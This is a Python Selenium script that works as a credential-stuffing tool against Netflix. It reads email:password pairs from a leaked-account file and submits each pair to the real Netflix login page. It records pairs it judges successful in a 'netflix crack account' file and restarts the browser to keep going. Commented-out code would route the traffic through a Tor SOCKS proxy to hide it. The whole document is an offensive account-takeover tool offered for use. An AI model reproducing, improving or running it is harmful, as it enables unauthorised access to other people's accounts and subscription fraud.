import time, os
from selenium import webdriver

start = time.time()
os.system('cls' if os.name == 'nt' else 'clear')
print('Cracking........')

file = open('F:\py practice\web scrapping\Selenium\\Netflix Account.txt', 'r')
raw_data = file.read()
email = ''
acc = []
for i in raw_data:

    if i == ':' or i == ' ':
        acc.append(email)
        email = ''
        continue

    if i == '\n':
        email = ''
    else:
        email += i
#print(acc[:50])
file.close()
browser = webdriver.Firefox(
    executable_path='F:\py practice\web scrapping\geckodriver-v0.26.0-win64\geckodriver.exe')

file_count = open(
    'F:\py practice\web scrapping\Selenium\\netflix crack acc count.txt', 'r')
i = int(file_count.read())
file_count.close()
Total_account = 0
while i < len(acc)/2:

    if i%25 == 0:
        browser.quit()
        browser = webdriver.Firefox(
            executable_path='F:\py practice\web scrapping\geckodriver-v0.26.0-win64\geckodriver.exe')
    file_count = open('F:\py practice\web scrapping\Selenium\\netflix crack acc count.txt', 'w')
    file_count.write(str(i))
    file_count.close()
    try:
       # browser.get('about:preferences')
       # elem_setting = browser.find_element_by_css_selector(
        #    '#connectionSettings')
        #elem_setting.click()
        #elm_manual_proxy = browser.find_element_by_css_selector(    '#networkProxyType > radio:nth-child(4)')
        #elm_manual_proxy.click()
        #elem_hostm = browser.find_element_by_css_selector('#networkProxySOCKS')
        #elem_hostm.send_keys('127.0.0.1')
        #elem_port = browser.find_element_by_css_selector(   '#networkProxySOCKS_Port')
        #elem_port.send_keys('9150')
        #elem_ok = browser.find_element_by_css_selector('button.dialog-button:nth-child(3)')
        #elem_ok.click()
        #time.sleep(50)
        browser.get('https://www.netflix.com/in/login')
        elem_email = browser.find_element_by_css_selector('#id_userLoginId')
        elem_email.send_keys(acc[i])
        elem_pass = browser.find_element_by_css_selector('#id_password')
        elem_pass.send_keys(acc[i+1])
        elem_pass.submit()
        time.sleep(5)
        #time.sleep(2)
        #browser.get('https://www.netflix.com/in/login')
    except:
        Total_account += 1
        file = open('F:\py practice\web scrapping\Selenium\\netflix crack account.txt', 'a')
        file.write('\n'+acc[i-3]+' '+acc[i-2])
        file.close()
        browser.quit()
        browser = webdriver.Firefox(
            executable_path='F:\py practice\web scrapping\geckodriver-v0.26.0-win64\geckodriver.exe')
        browser.get('https://www.netflix.com/in/login')
        elem_email = browser.find_element_by_css_selector(
            '#id_userLoginId')
        elem_email.send_keys(acc[i])
        elem_pass = browser.find_element_by_css_selector('#id_password')
        elem_pass.send_keys(acc[i+1])
        elem_pass.submit()
        time.sleep(5)
        print(Total_account)
        print(acc[i-3]+' '+acc[i-2])
    i+=3

file = open(
    'F:\py practice\web scrapping\Selenium\\netflix crack account.txt', 'a')
file.write('\n'+acc[i-2]+' '+acc[i-1])
file.close()

print('Total time = ',time.time()-start)
print('Total account = ',Total_account)
